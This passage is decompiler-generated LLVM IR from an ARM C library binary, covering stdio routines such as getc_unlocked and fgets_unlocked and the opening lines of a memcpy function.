  %v0_17120 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_17120, i32* %r0.global-to-local, align 4
  %v0_1715c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_17128:                               ; preds = %dec_label_pc_16e04
  %v3_17128 = load i16, i16* %arg1, align 2
  %v4_17128 = zext i16 %v3_17128 to i32
  %v1_1712c = and i32 %v4_17128, 64
  store i32 %v1_1712c, i32* %r3.global-to-local, align 4
  %v2_1712c = icmp eq i32 %v1_1712c, 0
  br i1 %v2_1712c, label %bb72, label %dec_label_pc_17138

bb72:                                             ; preds = %dec_label_pc_17128
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_17138:                               ; preds = %dec_label_pc_17128
  %v2_17138 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_17138, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1713c = icmp eq i32 %v2_17138, 0
  br i1 %v2_1713c, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_17138
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_17138
  %v1_17140 = load i32, i32* @r4, align 4
  %v2_17140 = inttoptr i32 %v1_17140 to i16*
  %v3_17140 = load i16, i16* %v2_17140, align 2
  %v4_17140 = zext i16 %v3_17140 to i32
  store i32 %v4_17140, i32* %r3.global-to-local, align 4
  %v2_17144 = add i32 %v1_17140, 8
  %v3_17144 = inttoptr i32 %v2_17144 to i32*
  %v4_17144 = load i32, i32* %v3_17144, align 4
  store i32 %v4_17144, i32* %r2.global-to-local, align 4
  %v2_17148 = and i32 %v4_17140, 65471
  store i32 %v2_17148, i32* %r3.global-to-local, align 4
  %v2_1714c = trunc i32 %v2_17148 to i16
  store i16 %v2_1714c, i16* %v2_17140, align 2
  %v1_17150 = load i32, i32* %r2.global-to-local, align 4
  %v2_17150 = load i32, i32* @r4, align 4
  %v3_17150 = add i32 %v2_17150, 28
  %v4_17150 = inttoptr i32 %v3_17150 to i32*
  store i32 %v1_17150, i32* %v4_17150, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_17120, %.thread14
  %v0_1715c = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_1715c.pre, %dec_label_pc_17120 ], [ 0, %.thread14 ]
  store i32 %v0_1715c, i32* %r0.global-to-local, align 4
  store i32 %v6_16dd8, i32* %r5.global-to-local, align 4
  ret i32 %v0_1715c

; uselistorder directives
  uselistorder i32 %v0_1715c, { 1, 0 }
  uselistorder i32 %v3_17114, { 1, 2, 0 }
  uselistorder i32 %v0_170e8, { 1, 0, 2 }
  uselistorder i32 %v1_170cc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1706c, { 1, 0, 2 }
  uselistorder i32 %v0_17034, { 1, 0, 2 }
  uselistorder i32 %v1_17018.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16ffc, { 1, 0 }
  uselistorder i32 %v0_16fa0, { 1, 0, 2 }
  uselistorder i32 %v1_16f84.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16f74, { 1, 0 }
  uselistorder i32 %v0_16f38, { 1, 0, 2 }
  uselistorder i32 %v1_16f1c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_16f04, { 1, 0 }
  uselistorder i32 %v0_16ecc, { 1, 0, 2 }
  uselistorder i32 %v1_16eb0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16ea0, { 1, 0 }
  uselistorder i32 %v0_16e5c, { 1, 0, 2 }
  uselistorder i32 %v1_16e40.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_16e18, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 5, 4, 6, 8, 7, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 55, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 19, 18, 54, 20, 21, 22, 23, 24, 25, 27, 26, 51, 28, 29, 30, 31, 33, 32, 52, 34, 35, 36, 37, 39, 38, 0, 40, 41, 42, 43, 45, 44, 53, 46, 47, 50, 48, 49 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 5, 3, 4, 22, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 23, 0 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 13, 3, 4, 5, 35, 36, 6, 7, 8, 9, 10, 39, 40, 11, 12, 1, 14, 15, 17, 16, 0, 18, 19, 20, 33, 34, 21, 22, 23, 24, 37, 38, 25, 26, 27, 31, 32, 28, 29, 30 }
  uselistorder i32 92, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 152, { 1, 3, 2, 4, 5, 8, 6, 9, 7, 10, 0, 11, 12, 14, 13, 15, 18, 16, 19, 17, 20 }
  uselistorder i32 129, { 7, 8, 9, 5, 6, 10, 11, 0, 1, 2, 3, 4, 12, 13 }
  uselistorder i32 -61504, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 35, 36, 32, 33 }
  uselistorder i32 -61441, { 16, 17, 18, 19, 20, 21, 12, 13, 14, 15, 22, 23, 24, 25, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0, 31, 26, 27, 28, 29, 30 }
  uselistorder label %bb73, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_17114, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_170ec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_170d4, { 1, 0 }
  uselistorder label %bb71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17054, { 1, 0 }
  uselistorder label %dec_label_pc_17048, { 1, 0 }
  uselistorder label %bb70, { 1, 0 }
  uselistorder label %dec_label_pc_17038, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17020, { 1, 0 }
  uselistorder label %dec_label_pc_16fdc, { 1, 0 }
  uselistorder label %dec_label_pc_16fccthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_16fa4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16f8c, { 1, 0 }
  uselistorder label %dec_label_pc_16f4c, { 1, 0 }
  uselistorder label %bb68, { 1, 0 }
  uselistorder label %dec_label_pc_16f3c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16f24, { 1, 0 }
  uselistorder label %dec_label_pc_16ef8, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16ed0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16eb8, { 1, 0 }
  uselistorder label %dec_label_pc_16e70, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %dec_label_pc_16e60, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16e48, { 1, 0 }
  uselistorder label %dec_label_pc_16e14, { 1, 0 }
}

define i32 @function_17170(i32 %arg1) local_unnamed_addr {
dec_label_pc_17170:
  %v0_17170 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17170, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_17170
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_17170, %bb
  %v10_17180 = phi i32 [ %arg1, %dec_label_pc_17170 ], [ 0, %bb ]
  ret i32 %v10_17180

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @getc_unlocked(i16* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_17184 = load i32, i32* @r4, align 4
  store i32 %v3_17184, i32* %stack_var_-12, align 4
  %v6_17184 = load i32, i32* @r5, align 4
  %v9_17184 = load i32, i32* @lr, align 4
  %v0_17188 = load i32, i32* @r0, align 4
  %v1_17188 = add i32 %v0_17188, 16
  %v2_17188 = inttoptr i32 %v1_17188 to i32*
  %v3_17188 = load i32, i32* %v2_17188, align 4
  store i32 %v3_17188, i32* %r2.global-to-local, align 4
  %v1_1718c = add i32 %v0_17188, 24
  %v2_1718c = inttoptr i32 %v1_1718c to i32*
  %v3_1718c = load i32, i32* %v2_1718c, align 4
  %v3_17190 = icmp ult i32 %v3_17188, %v3_1718c
  store i32 %v0_17188, i32* @r4, align 4
  br i1 %v3_17190, label %bb, label %dec_label_pc_171b0

bb:                                               ; preds = %entry
  %v2_1719c = inttoptr i32 %v3_17188 to i8*
  %v3_1719c = load i8, i8* %v2_1719c, align 1
  %v4_1719c = zext i8 %v3_1719c to i32
  store i32 %v4_1719c, i32* %r0.global-to-local, align 4
  %v6_1719c = add i32 %v3_17188, 1
  store i32 %v6_1719c, i32* %r2.global-to-local, align 4
  store i32 %v6_1719c, i32* %v2_17188, align 4
  br label %dec_label_pc_1729c

dec_label_pc_171b0:                               ; preds = %entry
  store i32 ptrtoint (i32* @global_var_221d4.362 to i32), i32* @r5, align 4
  %v1_171b0 = inttoptr i32 %v0_17188 to i16*
  %v2_171b0 = load i16, i16* %v1_171b0, align 2
  %v3_171b0 = zext i16 %v2_171b0 to i32
  %v1_171b4 = and i32 %v3_171b0, 131
  %tmp25 = icmp ugt i32 %v1_171b4, 128
  br i1 %tmp25, label %dec_label_pc_171d0, label %dec_label_pc_171c0

dec_label_pc_171c0:                               ; preds = %dec_label_pc_171b0
  store i32 128, i32* @r1, align 4
  %v0_171c4 = call i32 @__stdio_trans2r_o()
  store i32 %v0_171c4, i32* %r0.global-to-local, align 4
  %v2_171c8 = icmp eq i32 %v0_171c4, 0
  br i1 %v2_171c8, label %dec_label_pc_171c0.dec_label_pc_171d0_crit_edge, label %dec_label_pc_17298

dec_label_pc_171c0.dec_label_pc_171d0_crit_edge:  ; preds = %dec_label_pc_171c0
  %v0_171d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_171d0

dec_label_pc_171d0:                               ; preds = %dec_label_pc_171c0.dec_label_pc_171d0_crit_edge, %dec_label_pc_171b0
  %v2_17210 = phi i32 [ %v0_171d0.pre, %dec_label_pc_171c0.dec_label_pc_171d0_crit_edge ], [ %v0_17188, %dec_label_pc_171b0 ]
  %v1_171d0 = inttoptr i32 %v2_17210 to i16*
  %v2_171d0 = load i16, i16* %v1_171d0, align 2
  %v3_171d0 = zext i16 %v2_171d0 to i32
  store i32 %v3_171d0, i32* %r2.global-to-local, align 4
  %v1_171d4 = and i32 %v3_171d0, 2
  %v2_171d4 = icmp eq i32 %v1_171d4, 0
  br i1 %v2_171d4, label %dec_label_pc_17200, label %dec_label_pc_171dc

dec_label_pc_171dc:                               ; preds = %dec_label_pc_171d0
  %tmp26 = urem i16 %v2_171d0, 2
  %v1_171dc = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_171dc
  %v4_171e0 = and i32 %tmp22, 4
  %v5_171e0 = add i32 %v4_171e0, %v2_17210
  %v1_171e4 = add i32 %v5_171e0, 36
  %v2_171e4 = inttoptr i32 %v1_171e4 to i8*
  %v3_171e4 = load i8, i8* %v2_171e4, align 1
  %v4_171e4 = zext i8 %v3_171e4 to i32
  %v1_171e8 = add nsw i32 %v3_171d0, -1
  store i32 %v1_171e8, i32* %r2.global-to-local, align 4
  store i32 %v4_171e4, i32* %r0.global-to-local, align 4
  %v2_171f4 = add i32 %v2_17210, 40
  %v3_171f4 = inttoptr i32 %v2_171f4 to i32*
  store i32 0, i32* %v3_171f4, align 4
  %v0_171f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_171f8 = trunc i32 %v0_171f8 to i16
  %v2_171f8 = load i32, i32* @r4, align 4
  %v3_171f8 = inttoptr i32 %v2_171f8 to i16*
  store i16 %v1_171f8, i16* %v3_171f8, align 2
  br label %dec_label_pc_1729c

dec_label_pc_17200:                               ; preds = %dec_label_pc_171d0
  %v1_17200 = add i32 %v2_17210, 16
  %v1_17204 = inttoptr i32 %v1_17200 to i32*
  %v2_17204 = load i32, i32* %v1_17204, align 4
  store i32 %v2_17204, i32* @r1, align 4
  %v3_17204 = add i32 %v2_17210, 20
  %v4_17204 = inttoptr i32 %v3_17204 to i32*
  %v5_17204 = load i32, i32* %v4_17204, align 4
  %v9_17208 = icmp eq i32 %v5_17204, %v2_17204
  br i1 %v9_17208, label %dec_label_pc_17218, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_17200
  %v2_1720c = inttoptr i32 %v2_17204 to i8*
  %v3_1720c = load i8, i8* %v2_1720c, align 1
  %v4_1720c = zext i8 %v3_1720c to i32
  store i32 %v4_1720c, i32* %r0.global-to-local, align 4
  %v6_1720c = add i32 %v2_17204, 1
  store i32 %v6_1720c, i32* @r1, align 4
  store i32 %v6_1720c, i32* %v1_17204, align 4
  br label %dec_label_pc_1729c

dec_label_pc_17218:                               ; preds = %dec_label_pc_17200
  %v1_17218 = add i32 %v2_17210, 4
  %v2_17218 = inttoptr i32 %v1_17218 to i32*
  %v3_17218 = load i32, i32* %v2_17218, align 4
  %v7_1721c = icmp eq i32 %v3_17218, -2
  br i1 %v7_1721c, label %.thread7, label %dec_label_pc_17230

.thread7:                                         ; preds = %dec_label_pc_17218
  %v2_17220 = or i16 %v2_171d0, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_17220, i16* %v1_171d0, align 2
  br label %dec_label_pc_1729c

dec_label_pc_17230:                               ; preds = %dec_label_pc_17218
  %v1_17230 = and i32 %v3_171d0, 768
  %v2_17230 = icmp eq i32 %v1_17230, 0
  br i1 %v2_17230, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_17230
  %v1_17238 = load i32, i32* @r5, align 4
  %v3_17238 = add i32 %v1_17238, 76
  %v4_17238 = inttoptr i32 %v3_17238 to i32*
  %v5_17238 = load i32, i32* %v4_17238, align 4
  store i32 %v5_17238, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_17230, %bb23
  store i32 94784, i32* @lr, align 4
  %v1_1723c = xor i1 %v2_17230, true
  call void @__pseudo_cond_branch(i1 %v1_1723c, i32 ptrtoint (i32* @global_var_16dd8.611 to i32))
  %v0_17240 = load i32, i32* @r4, align 4
  %v1_17240 = add i32 %v0_17240, 8
  store i32 %v1_17240, i32* %r2.global-to-local, align 4
  %v1_17244 = inttoptr i32 %v1_17240 to i32*
  %v2_17244 = load i32, i32* %v1_17244, align 4
  store i32 %v2_17244, i32* %r2.global-to-local, align 4
  %v3_17244 = add i32 %v0_17240, 12
  %v4_17244 = inttoptr i32 %v3_17244 to i32*
  %v5_17244 = load i32, i32* %v4_17244, align 4
  %v9_17248 = icmp eq i32 %v5_17244, %v2_17244
  br i1 %v9_17248, label %dec_label_pc_1727c, label %dec_label_pc_17250

dec_label_pc_17250:                               ; preds = %.thread9
  %v2_17250 = add i32 %v0_17240, 24
  %v3_17250 = inttoptr i32 %v2_17250 to i32*
  store i32 %v2_17244, i32* %v3_17250, align 4
  %v0_17254 = load i32, i32* @r4, align 4
  store i32 %v0_17254, i32* %r0.global-to-local, align 4
  %v2_17258 = call i32 @__stdio_rfill(i32 %v0_17254)
  store i32 %v2_17258, i32* %r0.global-to-local, align 4
  %v2_1725c = icmp eq i32 %v2_17258, 0
  br i1 %v2_1725c, label %dec_label_pc_17298, label %dec_label_pc_17264

dec_label_pc_17264:                               ; preds = %dec_label_pc_17250
  %v0_17264 = load i32, i32* @r4, align 4
  %v1_17264 = add i32 %v0_17264, 20
  %v2_17264 = inttoptr i32 %v1_17264 to i32*
  %v3_17264 = load i32, i32* %v2_17264, align 4
  %v2_17268 = add i32 %v0_17264, 24
  %v3_17268 = inttoptr i32 %v2_17268 to i32*
  store i32 %v3_17264, i32* %v3_17268, align 4
  %v0_1726c = load i32, i32* @r4, align 4
  %v1_1726c = add i32 %v0_1726c, 16
  %v2_1726c = inttoptr i32 %v1_1726c to i32*
  %v3_1726c = load i32, i32* %v2_1726c, align 4
  %v1_17270 = inttoptr i32 %v3_1726c to i8*
  %v2_17270 = load i8, i8* %v1_17270, align 1
  %v3_17270 = zext i8 %v2_17270 to i32
  store i32 %v3_17270, i32* %r0.global-to-local, align 4
  %v5_17270 = add i32 %v3_1726c, 1
  store i32 %v5_17270, i32* %v2_1726c, align 4
  br label %dec_label_pc_1729c

dec_label_pc_1727c:                               ; preds = %.thread9
  %v1_1727c = inttoptr i32 %v0_17240 to i16*
  store i32 %v0_17240, i32* %r0.global-to-local, align 4
  %v2_17280 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_17280, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_17288 = call i32 @__stdio_READ(i16* %v1_1727c, i32 %v2_17280, i32 1)
  store i32 %v5_17288, i32* %r0.global-to-local, align 4
  %v2_1728c = icmp eq i32 %v5_17288, 0
  br i1 %v2_1728c, label %dec_label_pc_17298, label %bb24

bb24:                                             ; preds = %dec_label_pc_1727c
  %v4_17290 = load i8, i8* %stack_var_-17, align 1
  %v5_17290 = sext i8 %v4_17290 to i32
  store i32 %v5_17290, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1729c

dec_label_pc_17298:                               ; preds = %dec_label_pc_1727c, %dec_label_pc_171c0, %dec_label_pc_17250
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1729c

dec_label_pc_1729c:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_17264, %dec_label_pc_171dc, %dec_label_pc_17298
  %v2_172a0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_172a0, i32* @r4, align 4
  store i32 %v6_17184, i32* @r5, align 4
  store i32 %v9_17184, i32* @lr, align 4
  %v1_172a4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_172a4

; uselistorder directives
  uselistorder i32 %v2_17204, { 1, 0, 2, 3 }
  uselistorder i32 %v2_17210, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_17188, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 13, 12 }
  uselistorder i32 768, { 2, 0, 3, 1, 4 }
  uselistorder label %dec_label_pc_1729c, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_17298, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_172b0 = load i32, i32* @r6, align 4
  %v12_172b0 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_172b4 = icmp eq i32 %arg2, 0
  store i1 %v2_172b4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_1733c, label %dec_label_pc_17324.preheader

dec_label_pc_17324.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_173242 = add i32 %arg2, -1
  store i32 %v1_173242, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_173248 = icmp eq i32 %arg2, 1
  store i1 %v7_173248, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_173248, label %dec_label_pc_1732c, label %dec_label_pc_172d0

dec_label_pc_172d0:                               ; preds = %dec_label_pc_17324.preheader, %dec_label_pc_17324.backedge.dec_label_pc_172d0_crit_edge
  %v0_172f4 = phi i32 [ %v0_172d0.pre, %dec_label_pc_17324.backedge.dec_label_pc_172d0_crit_edge ], [ %arg3, %dec_label_pc_17324.preheader ]
  %v1_172d0 = add i32 %v0_172f4, 16
  %v2_172d0 = inttoptr i32 %v1_172d0 to i32*
  %v3_172d0 = load i32, i32* %v2_172d0, align 4
  store i32 %v3_172d0, i32* %r2.global-to-local, align 4
  %v1_172d4 = add i32 %v0_172f4, 24
  %v2_172d4 = inttoptr i32 %v1_172d4 to i32*
  %v3_172d4 = load i32, i32* %v2_172d4, align 4
  store i32 %v3_172d4, i32* %r3.global-to-local, align 4
  %v3_172d8 = icmp uge i32 %v3_172d0, %v3_172d4
  store i1 %v3_172d8, i1* %cpsr_c.global-to-local, align 1
  %v9_172d8 = icmp eq i32 %v3_172d0, %v3_172d4
  store i1 %v9_172d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_172d8, label %dec_label_pc_172f4, label %dec_label_pc_172e0

dec_label_pc_172e0:                               ; preds = %dec_label_pc_172d0
  %v1_172e0 = inttoptr i32 %v3_172d0 to i8*
  %v2_172e0 = load i8, i8* %v1_172e0, align 1
  %v3_172e0 = zext i8 %v2_172e0 to i32
  store i32 %v3_172e0, i32* %r3.global-to-local, align 4
  %v5_172e0 = add i32 %v3_172d0, 1
  store i32 %v5_172e0, i32* %r2.global-to-local, align 4
  %v2_172e4 = load i32, i32* @r5, align 4
  %v3_172e4 = inttoptr i32 %v2_172e4 to i8*
  store i8 %v2_172e0, i8* %v3_172e4, align 1
  %v4_172e4 = load i32, i32* @r5, align 4
  %v5_172e4 = add i32 %v4_172e4, 1
  store i32 %v5_172e4, i32* @r5, align 4
  %v0_172e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_172e8 = icmp ugt i32 %v0_172e8, 9
  store i1 %v2_172e8, i1* %cpsr_c.global-to-local, align 1
  %v7_172e8 = icmp eq i32 %v0_172e8, 10
  store i1 %v7_172e8, i1* %cpsr_z.global-to-local, align 1
  %v0_172ec = load i32, i32* %r2.global-to-local, align 4
  %v1_172ec = load i32, i32* @r4, align 4
  %v2_172ec = add i32 %v1_172ec, 16
  %v3_172ec = inttoptr i32 %v2_172ec to i32*
  store i32 %v0_172ec, i32* %v3_172ec, align 4
  br i1 %v7_172e8, label %dec_label_pc_1732c, label %dec_label_pc_17324.backedge

dec_label_pc_172f4:                               ; preds = %dec_label_pc_172d0
  %v1_172f4 = inttoptr i32 %v0_172f4 to i16*
  %v3_172f8 = call i32 @getc_unlocked(i16* %v1_172f4)
  %v3_172fc = icmp eq i32 %v3_172f8, -1
  store i1 %v3_172fc, i1* %cpsr_c.global-to-local, align 1
  %v8_172fc = icmp eq i32 %v3_172f8, -1
  store i1 %v8_172fc, i1* %cpsr_z.global-to-local, align 1
  %v1_17300 = urem i32 %v3_172f8, 256
  store i32 %v1_17300, i32* %r3.global-to-local, align 4
  br i1 %v3_172fc, label %dec_label_pc_17308, label %dec_label_pc_17320

dec_label_pc_17308:                               ; preds = %dec_label_pc_172f4
  %v0_17308 = load i32, i32* @r4, align 4
  %v1_17308 = inttoptr i32 %v0_17308 to i16*
  %v2_17308 = load i16, i16* %v1_17308, align 2
  %v3_17308 = zext i16 %v2_17308 to i32
  store i32 %v3_17308, i32* %r3.global-to-local, align 4
  %v1_1730c = and i32 %v3_17308, 8
  %v2_1730c = icmp eq i32 %v1_1730c, 0
  store i1 %v2_1730c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1730c, label %dec_label_pc_1732c, label %dec_label_pc_1733c

dec_label_pc_17320:                               ; preds = %dec_label_pc_172f4
  %v1_17318 = trunc i32 %v3_172f8 to i8
  %v2_17318 = load i32, i32* @r5, align 4
  %v3_17318 = inttoptr i32 %v2_17318 to i8*
  store i8 %v1_17318, i8* %v3_17318, align 1
  %v4_17318 = load i32, i32* @r5, align 4
  %v5_17318 = add i32 %v4_17318, 1
  store i32 %v5_17318, i32* @r5, align 4
  %v0_1731c = load i32, i32* %r3.global-to-local, align 4
  %v2_1731c = icmp ugt i32 %v0_1731c, 9
  store i1 %v2_1731c, i1* %cpsr_c.global-to-local, align 1
  %v7_1731c = icmp eq i32 %v0_1731c, 10
  store i1 %v7_1731c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1731c, label %dec_label_pc_1732c, label %dec_label_pc_17324.backedge

dec_label_pc_17324.backedge:                      ; preds = %dec_label_pc_17320, %dec_label_pc_172e0
  %v0_17324 = load i32, i32* @r6, align 4
  %v1_17324 = add i32 %v0_17324, -1
  store i32 %v1_17324, i32* @r6, align 4
  %v2_17324 = icmp ne i32 %v0_17324, 0
  store i1 %v2_17324, i1* %cpsr_c.global-to-local, align 1
  %v7_17324 = icmp eq i32 %v0_17324, 1
  store i1 %v7_17324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17324, label %dec_label_pc_1732c, label %dec_label_pc_17324.backedge.dec_label_pc_172d0_crit_edge

dec_label_pc_17324.backedge.dec_label_pc_172d0_crit_edge: ; preds = %dec_label_pc_17324.backedge
  %v0_172d0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_172d0

dec_label_pc_1732c:                               ; preds = %dec_label_pc_17320, %dec_label_pc_17324.backedge, %dec_label_pc_172e0, %dec_label_pc_17324.preheader, %dec_label_pc_17308
  %v0_1732c = load i32, i32* @r5, align 4
  %v1_1732c = load i32, i32* @r7, align 4
  %v3_1732c = icmp uge i32 %v0_1732c, %v1_1732c
  store i1 %v3_1732c, i1* %cpsr_c.global-to-local, align 1
  %v9_1732c = icmp eq i32 %v0_1732c, %v1_1732c
  store i1 %v9_1732c, i1* %cpsr_z.global-to-local, align 1
  %v2_17330 = xor i1 %v9_1732c, true
  %v3_17330 = and i1 %v3_1732c, %v2_17330
  br i1 %v3_17330, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_1732c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_17334 = inttoptr i32 %v0_1732c to i8*
  store i8 0, i8* %v7_17334, align 1
  %v0_17338.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_17338.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_1732c, %bb
  %v1_17338 = phi i1 [ %v1_17338.pre, %bb ], [ %v9_1732c, %dec_label_pc_1732c ]
  %v0_17338 = phi i1 [ %v0_17338.pre, %bb ], [ %v3_1732c, %dec_label_pc_1732c ]
  %v2_17338 = xor i1 %v1_17338, true
  %v3_17338 = and i1 %v0_17338, %v2_17338
  br i1 %v3_17338, label %.dec_label_pc_17340_crit_edge, label %dec_label_pc_1733c

.dec_label_pc_17340_crit_edge:                    ; preds = %.thread14
  %v0_17340.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17340

dec_label_pc_1733c:                               ; preds = %entry, %dec_label_pc_17308, %.thread14
  br label %dec_label_pc_17340

dec_label_pc_17340:                               ; preds = %.dec_label_pc_17340_crit_edge, %dec_label_pc_1733c
  %v0_17340 = phi i32 [ %v0_17340.pre, %.dec_label_pc_17340_crit_edge ], [ 0, %dec_label_pc_1733c ]
  store i32 %v9_172b0, i32* @r6, align 4
  store i32 %v12_172b0, i32* @r7, align 4
  ret i32 %v0_17340

; uselistorder directives
  uselistorder i1 %v9_1732c, { 1, 0, 2 }
  uselistorder i32 %v1_1732c, { 1, 0 }
  uselistorder i32 %v0_1732c, { 0, 2, 1 }
  uselistorder i32 %v0_17324, { 2, 0, 1 }
  uselistorder i32 %v0_1731c, { 1, 0 }
  uselistorder i32 %v3_172f8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_172e8, { 1, 0 }
  uselistorder i32 %v3_172d0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_172f4, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 8, 3, 4, 5, 6, 7, 0, 9 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 7, 3, 4, 5, 6, 0, 8 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_17340, { 1, 0 }
  uselistorder label %dec_label_pc_1733c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_1732c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_172d0, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_17350 = load i32, i32* @r1, align 4
  %v1_17350 = load i32, i32* @r0, align 4
